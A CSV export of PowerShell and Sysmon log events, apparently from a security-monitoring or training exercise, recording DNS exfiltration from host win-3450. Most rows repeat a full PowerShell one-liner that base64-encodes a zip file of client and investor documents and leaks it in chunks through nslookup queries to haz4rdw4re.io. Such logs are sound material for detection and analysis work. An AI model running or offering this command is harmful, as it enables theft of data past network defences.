"_id","_ignored","_index","_score",attachment,content,datasource,direction,"dns.answers.data","dns.question.name","dns.resolved_ip","event.action","event.code","file.path","host.name",message,"network.protocol","powershell.command.invocation_details.value","powershell.command.name","powershell.file.script_block_text","process.command_line","process.name","process.parent.name","process.parent.pid","process.pid","process.working_directory",recipient,"registry.key","registry.path","registry.value",sender,subject,timestamp,"winlog.process.pid"
"NXV6ypsB8mE-0EyZn3_T","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=451	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AFBLAQIUABQAAAAIANigLlfVU3cDIg.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AFBLAQIUABQAAAAIANigLlfVU3cDIg.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"M3V6ypsB8mE-0EyZnH8O","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=465	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup IAAgCUAAAAtQAAAAAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup IAAgCUAAAAtQAAAAAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"QXV6ypsB8mE-0EyZzn-5","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=467	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Where-Object): ""Where-Object""ParameterBinding(Where-Object): name=""FilterScript""; value="" $_ -ne '' ""CommandInvocation(ForEach-Object): ""ForEach-Object""ParameterBinding(ForEach-Object): name=""Process""; value=""Invoke-Expression ""nslookup $_.haz4rdw4re.io""""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""UEsDBBQAAAAIANigLlfVU3cDIgAAAI""ParameterBinding(ForEach-Object): name=""InputObject""; value=""UEsDBBQAAAAIANigLlfVU3cDIgAAAI""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv""ParameterBinding(ForEach-Object): name=""InputObject""; value=""8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""U3VtbWFyeS54bHN4c87JTM0rCcgvKk""ParameterBinding(ForEach-Object): name=""InputObject""; value=""U3VtbWFyeS54bHN4c87JTM0rCcgvKk""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""nLz8nMDy7NzU0sqtSryCmu4OVyprsk""ParameterBinding(ForEach-Object): name=""InputObject""; value=""nLz8nMDy7NzU0sqtSryCmu4OVyprsk""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AFBLAwQUAAAACAC9oC5XHhlO5R8AAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AFBLAwQUAAAACAC9oC5XHhlO5R8AAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AdAAAAHQAAAEludmVzdG9yUHJlc2Vu""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AdAAAAHQAAAEludmVzdG9yUHJlc2Vu""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""dGF0aW9uMjAyMy5wcHR488wrSy0uyS""ParameterBinding(ForEach-Object): name=""InputObject""; value=""dGF0aW9uMjAyMy5wcHR488wrSy0uyS""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""8KKEotTs0rSSzJzM8zMjAy1isoKKkA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""8KKEotTs0rSSzJzM8zMjAy1isoKKkA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AFBLAQIUABQAAAAIANigLlfVU3cDIg""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AFBLAQIUABQAAAAIANigLlfVU3cDIg""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AABDbGllbnRQb3J0Zm9saW9TdW1tYX""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AABDbGllbnRQb3J0Zm9saW9TdW1tYX""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""J5Lnhsc3hQSwECFAAUAAAACAC9oC5X""ParameterBinding(ForEach-Object): name=""InputObject""; value=""J5Lnhsc3hQSwECFAAUAAAACAC9oC5X""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AAAABbAAAASW52ZXN0b3JQcmVzZW50""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AAAABbAAAASW52ZXN0b3JQcmVzZW50""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""YXRpb24yMDIzLnBwdHhQSwUGAAAAAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""YXRpb24yMDIzLnBwdHhQSwUGAAAAAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""IAAgCUAAAAtQAAAAAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""IAAgCUAAAAtQAAAAAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""","-","""Where-Object"", "" $_ -ne '' "", ""ForEach-Object"", ""Invoke-Expression ""nslookup $_.haz4rdw4re.io"""", """", ""UEsDBBQAAAAIANigLlfVU3cDIgAAAI"", ""UEsDBBQAAAAIANigLlfVU3cDIgAAAI"", """", ""8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv"", ""8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv"", """", ""U3VtbWFyeS54bHN4c87JTM0rCcgvKk"", ""U3VtbWFyeS54bHN4c87JTM0rCcgvKk"", """", ""nLz8nMDy7NzU0sqtSryCmu4OVyprsk"", ""nLz8nMDy7NzU0sqtSryCmu4OVyprsk"", """", ""AFBLAwQUAAAACAC9oC5XHhlO5R8AAA"", ""AFBLAwQUAAAACAC9oC5XHhlO5R8AAA"", """", ""AdAAAAHQAAAEludmVzdG9yUHJlc2Vu"", ""AdAAAAHQAAAEludmVzdG9yUHJlc2Vu"", """", ""dGF0aW9uMjAyMy5wcHR488wrSy0uyS"", ""dGF0aW9uMjAyMy5wcHR488wrSy0uyS"", """", ""8KKEotTs0rSSzJzM8zMjAy1isoKKkA"", ""8KKEotTs0rSSzJzM8zMjAy1isoKKkA"", """", ""AFBLAQIUABQAAAAIANigLlfVU3cDIg"", ""AFBLAQIUABQAAAAIANigLlfVU3cDIg"", """", ""AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA"", ""AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA"", """", ""AABDbGllbnRQb3J0Zm9saW9TdW1tYX"", ""AABDbGllbnRQb3J0Zm9saW9TdW1tYX"", """", ""J5Lnhsc3hQSwECFAAUAAAACAC9oC5X"", ""J5Lnhsc3hQSwECFAAUAAAACAC9oC5X"", """", ""HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA"", ""HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA"", """", ""AAAABbAAAASW52ZXN0b3JQcmVzZW50"", ""AAAABbAAAASW52ZXN0b3JQcmVzZW50"", """", ""YXRpb24yMDIzLnBwdHhQSwUGAAAAAA"", ""YXRpb24yMDIzLnBwdHhQSwUGAAAAAA"", """", ""IAAgCUAAAAtQAAAAAA"", ""IAAgCUAAAAtQAAAAAA"", """"","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"PnV6ypsB8mE-0EyZw38C","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=455	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AABDbGllbnRQb3J0Zm9saW9TdW1tYX.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AABDbGllbnRQb3J0Zm9saW9TdW1tYX.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"RXV6ypsB8mE-0EyZ8n8U","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=453	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"Q3V6ypsB8mE-0EyZ2n-a","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=457	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup J5Lnhsc3hQSwECFAAUAAAACAC9oC5X.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup J5Lnhsc3hQSwECFAAUAAAACAC9oC5X.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"LHV6ypsB8mE-0EyZXX9s","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" U3VtbWFyeS54bHN4c87JTM0rCcgvKk.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,5432,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"KXV6ypsB8mE-0EyZTX_b","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" 8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,3952,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"K3V6ypsB8mE-0EyZWX-Q","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=443	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AFBLAwQUAAAACAC9oC5XHhlO5R8AAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AFBLAwQUAAAACAC9oC5XHhlO5R8AAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"MHV6ypsB8mE-0EyZhH-d","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=445	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AdAAAAHQAAAEludmVzdG9yUHJlc2Vu.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AdAAAAHQAAAEludmVzdG9yUHJlc2Vu.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"L3V6ypsB8mE-0EyZfH_T","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" AFBLAwQUAAAACAC9oC5XHhlO5R8AAA.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,6604,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"MXV6ypsB8mE-0EyZjH9U","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" dGF0aW9uMjAyMy5wcHR488wrSy0uyS.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,5696,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"OXV6ypsB8mE-0EyZs39q","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3454","-","-","-","-","-","atbroker.exe","AtBroker.exe","winlogon.exe",3677,3861,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"O3V6ypsB8mE-0EyZu39M","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=435	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
